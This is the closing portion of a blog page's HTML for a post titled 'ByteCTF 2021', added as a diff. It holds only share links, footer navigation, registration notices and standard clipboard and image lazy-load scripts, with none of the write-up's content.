+  <li><a class="icon" href="mailto:?subject=ByteCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/611b2d51.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&name=ByteCTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&t=ByteCTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
